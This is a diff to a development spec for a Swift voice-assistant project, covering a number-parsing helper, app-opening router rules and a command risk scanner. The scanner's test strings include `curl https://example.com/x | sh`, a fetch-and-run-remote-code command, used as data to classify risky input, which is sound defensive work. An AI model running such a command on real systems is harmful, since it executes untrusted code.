@@ -163,10 +163,10 @@ Rules:
 4. Always prefer the longest valid match at `start`.
 
 `XCTAssertEqual` cannot compare a labelled-tuple optional, so every S-row goes through this helper (copy it to the bottom of
-`SpokenNumberTests.swift`, at column 0 after the class; `expected == nil` means "must be nil"):
+`SpokenNumberTests.swift`, at column 0 after the class, `private` as global rule 8 requires of every column-0 helper; `expected == nil` means "must be nil"):
 
 ```swift
-func assertParse(_ tokens: [String], _ start: Int, _ expected: (Int, Int)?,
+private func assertParse(_ tokens: [String], _ start: Int, _ expected: (Int, Int)?,
                  file: StaticString = #filePath, line: UInt = #line) {
     let result = SpokenNumber.parse(tokens, at: start)
     XCTAssertEqual(result == nil, expected == nil, "nil-ness of \(tokens) at \(start)", file: file, line: line)
@@ -320,6 +320,7 @@ which must be the last token. Any leftover token means no match.
 Strip at most ONE leading article (`the`, `a`, `aplikasi`) and at most ONE trailing suffix
 (`app`, `application`, `aplikasi`), and strip the suffix only when the remainder is non-empty (so `open the app` has `NAME = ["app"]`, which
 is not in the catalog). If `NAME` is not in the catalog the grammar does not match (rule 11 then gives `.unknownApp`).
+**Try every `VERB` alternative, longest first** (`open up` before `open`): the first alternative whose remainder (after the article/suffix stripping) is a catalog hit wins, so `open up safari` is `VERB` `open up` + `NAME` `[safari]` and gives `.local(.openApp(bundleID: "com.apple.Safari", name: "Safari"))`, while `open up` alone is `VERB` `open` + `NAME` `[up]` (not in the catalog) and gives `.reject(.unknownApp)` through rule 11. If stripping the article and suffix leaves `NAME` EMPTY (`buka aplikasi`, `open the`), the grammar does not match and rule 11 gives `.reject(.unknownApp)` (2 to 5 tokens). Two extra router tests beyond the 72 rows (named, so the check script finds them): `testRouterOpenUpSafariUsesTheLongestVerb` and `testRouterBukaAplikasiAloneIsUnknownApp`.
 
 #### Router worked examples
 
@@ -556,6 +557,7 @@ Worked examples (`flags` compared exactly with `==`, listed as option sets). **O
 test strings are `cat notes.txt | grep foo`, `curl https://example.com/x | sh`, `echo aGk= | base64 -d` and `echo a || echo b`.
 The 33 inputs, flags and tiers are also given as a Swift array literal right below the table; if the table and the literal ever
 disagree, the literal wins.
+**Comment hygiene:** the example `python3 -c 'print(1)'` (C27) belongs in the TESTS only. The orchestrator's `rg` passes ban `print(` in `Sources/DesnotchCore/Voice` comments too (the scanner file's own allowlist covers only the dangerous words as data, pass 2b bans `print(` there), so never copy that string, or any `print(` text, into a comment of `CommandRiskScanner.swift`. A command that is only a newline (`"\n"`, `"  \n "`) sanitizes to the single character `⏎`, which is not empty, so by the literal algorithm it gets `[.chaining]` and `.t2`; that is accepted (harmless, the card shows `⏎`) and no row is added for it.
 
 | # | command | flags | tier | notes |
 |---|---|---|---|---|
@@ -730,7 +732,7 @@ Every rule below is built from these. `next` is a copy of the incoming context; 
 #### Stale events (rule R01)
 
 An event with a `generation` payload is **current** when `generation == context.generation`, or
-(`context.interrupt != nil` and `generation == context.interrupt!.generation`). A non-current event is
+(`context.interrupt?.generation == generation`; write it with optional chaining or `if let`, never a force unwrap). A non-current event is
 a no-op, with exactly one exception: `.agent(.usage(...), generation:)` always yields
 `[.audit(AuditDraft(kind: .cost, counters: [...]))]` (see R88) even when stale, so cost accounting is
 never lost.
